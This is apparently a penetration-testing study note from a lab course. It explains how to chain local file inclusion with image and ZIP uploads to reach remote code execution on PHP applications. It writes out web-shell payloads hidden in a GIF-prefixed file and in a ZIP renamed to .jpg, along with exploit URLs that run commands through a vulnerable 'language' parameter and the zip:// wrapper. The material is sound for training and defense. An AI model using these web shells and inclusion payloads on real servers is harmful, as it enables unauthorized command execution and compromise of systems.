# LFI and File Uploads

## 1. Overview

**Local File Inclusion (LFI) combined with file uploads** can lead to Remote Code Execution (RCE) when an application allows users to upload files and a vulnerable file inclusion function executes code contained within those files.

The file upload functionality itself does **not** need to be vulnerable. The key requirements are:

* The application allows a file to be uploaded and stored on the server.
* The attacker can determine or discover the uploaded file's path.
* The LFI vulnerability can include the uploaded file.
* The vulnerable function executes the code contained in the included file.

### Attack Concept

1. Create a file containing server-side code.
2. Upload the file using an allowed file extension or format.
3. Identify the uploaded file's location.
4. Include the uploaded file through the LFI vulnerability.
5. If the inclusion function executes the code, achieve RCE.

**Key takeaway:** A file that is harmless when uploaded or accessed as an ordinary image may execute server-side code when included by a vulnerable application.

## 2. Functions That May Execute Included Code

The following functions are identified in the source material as potentially supporting code execution through file inclusion.

| Language | Function                       | Reads Content | Executes Code | Supports Remote URLs |
| -------- | ------------------------------ | ------------- | ------------- | -------------------- |
| PHP      | `include()` / `include_once()` | Yes           | Yes           | Yes                  |
| PHP      | `require()` / `require_once()` | Yes           | Yes           | No                   |
| Node.js  | `res.render()`                 | Yes           | Yes           | No                   |
| Java     | `import`                       | Yes           | Yes           | Yes                  |
| .NET     | `include`                      | Yes           | Yes           | Yes                  |

**Important:** The ability to execute code depends on the application, runtime, function behavior, and execution context. The table describes the capabilities presented in the source material.

## 3. Image Upload Technique

Image uploads are common in web applications, particularly for profile pictures and avatars.

This technique abuses the combination of:

* A file upload feature that stores an uploaded file.
* An LFI vulnerability that can include the uploaded file.
* A server-side execution context that interprets the code inside the included file.

### Step 1: Create a Malicious Image File

The example uses a GIF-like file containing PHP code.

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Explanation:

| Component      | Purpose                                                         |
| -------------- | --------------------------------------------------------------- |
| `GIF8`         | GIF-like magic bytes used to resemble an image                  |
| `<?php ... ?>` | PHP code block                                                  |
| `system()`     | Executes an operating-system command                            |
| `$_GET["cmd"]` | Reads the command from the URL's `cmd` parameter                |
| `shell.gif`    | Uses an image extension that may be accepted by the upload form |

The `GIF8` prefix may help bypass simple checks that look for an image extension or recognizable file signature.

**Note:** This file is not necessarily a valid, viewable GIF image. Its relevance is that the included PHP code may be interpreted by the server even though the filename ends in `.gif`.

The technique may also work with other accepted file formats, depending on the upload validation and inclusion behavior.

### Step 2: Upload the File

Upload `shell.gif` through the application's normal file upload functionality.

Example location:

```text
http://<SERVER_IP>:<PORT>/settings.php
```

In the HTB example, the file is uploaded through the profile settings page.

**Important:** The upload feature does not have to allow unrestricted file types. The example attempts to use an allowed image extension and a recognizable image signature.

### Step 3: Discover the Uploaded File Path

After uploading the file, inspect the page source or the HTML element displaying the uploaded image.

Example HTML:

```html
<img src="/profile_images/shell.gif"
     class="profile-image"
     id="profile-image">
```

The uploaded file's web path is:

```text
/profile_images/shell.gif
```

This path can then be used as input to the LFI vulnerability, subject to how the application resolves filesystem paths.

#### If the Upload Path Is Unknown

* Inspect the HTML source and image URL.
* Check the application's responses for references to the uploaded file.
* In an authorized lab, enumerate likely upload directories and filenames if necessary.

Some applications deliberately hide uploaded files or use generated filenames, so the path may not be immediately apparent.

### Step 4: Include the Uploaded File Through LFI

Example request:

```text
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

Parameter breakdown:

| Parameter                    | Purpose                                 |
| ---------------------------- | --------------------------------------- |
| `language`                   | The vulnerable file inclusion parameter |
| `./profile_images/shell.gif` | Path to the uploaded file               |
| `cmd=id`                     | Supplies the command to the PHP code    |

If the vulnerable function executes PHP contained in the included file, the `id` command may execute under the web application's operating-system account.

### Directory Traversal Consideration

In this example, the vulnerable function does not automatically prepend a directory to the supplied path, so the path can be specified directly.

If the application prepends a directory, traversal sequences such as `../` may be needed to reach the intended path, depending on the application's path handling.

**Exam point:** The correct inclusion path depends on the location of the vulnerable script, the uploaded file's filesystem location, and any path transformations performed by the application.

## 4. ZIP Upload Technique

A second technique uses PHP's `zip://` stream wrapper to include a PHP script stored inside a ZIP archive.

This is a PHP-specific approach and may be useful when direct inclusion of an uploaded image containing PHP code does not work.

### Step 1: Create a PHP Script and ZIP Archive

Create a PHP script:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Place the script inside a ZIP archive named `shell.jpg`:

```bash
zip shell.jpg shell.php
```

The archive now has a `.jpg` filename even though its contents are ZIP data.

**Important:** Renaming an archive does not change its underlying file format. Upload validation that examines file signatures or content types may still identify it as a ZIP archive.

### Step 2: Upload the Archive

Upload `shell.jpg` using the application's file upload functionality.

This approach is more likely to work when the application allows ZIP archives or does not reject the archive based on its actual content.

### Step 3: Include the PHP File Using the ZIP Wrapper

Example request:

```text
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

### Payload Breakdown

| Component                    | Purpose                                                 |
| ---------------------------- | ------------------------------------------------------- |
| `zip://`                     | PHP wrapper used to access content inside a ZIP archive |
| `./profile_images/shell.jpg` | Path to the uploaded archive                            |
| `%23`                        | URL-encoded `#` character                               |
| `shell.php`                  | Name of the PHP file inside the archive                 |
| `cmd=id`                     | Command supplied to the PHP script                      |

The conceptual ZIP wrapper syntax is:

```text
zip://<ARCHIVE_PATH>#<FILE_INSIDE_ARCHIVE>
```

The `#` identifies the file inside the archive. It is URL-encoded as `%23` in the example URL so that it is passed as part of the parameter value rather than being interpreted as the URL fragment delimiter.

### Step 4: Verify Execution

If the application successfully processes the ZIP wrapper and executes the included PHP code, the supplied command may execute on the server.

Example command parameter:

```text
&cmd=id
```

The response may contain the identity of the account executing the web application.

### ZIP Wrapper Limitations

* The `zip://` wrapper must be available in the PHP environment.
* The upload must preserve the ZIP archive.
* The archive path and internal filename must be correct.
* The vulnerable inclusion function must support the wrapper.
* The application must execute the included PHP code for RCE to occur.

**Key takeaway:** The ZIP method is an alternative technique, not a guarantee that every LFI vulnerability can be escalated to RCE.

## 5. Image Upload vs. ZIP Upload

| Feature              | Image Upload Technique                                        | ZIP Upload Technique                                                 |
| -------------------- | ------------------------------------------------------------- | -------------------------------------------------------------------- |
| Uploaded file        | Image-like file containing PHP code                           | ZIP archive containing a PHP script                                  |
| Example filename     | `shell.gif`                                                   | `shell.jpg`                                                          |
| PHP wrapper required | Not specifically                                              | Yes, `zip://`                                                        |
| Main requirement     | Included file's PHP code is interpreted                       | ZIP wrapper can access the internal PHP file, which is then executed |
| Upload validation    | Image extension/signature checks may be relevant              | Archive content or MIME checks may reject the file                   |
| Main limitation      | Inclusion may treat the file as plain content rather than PHP | ZIP wrapper or archive processing may be unavailable                 |
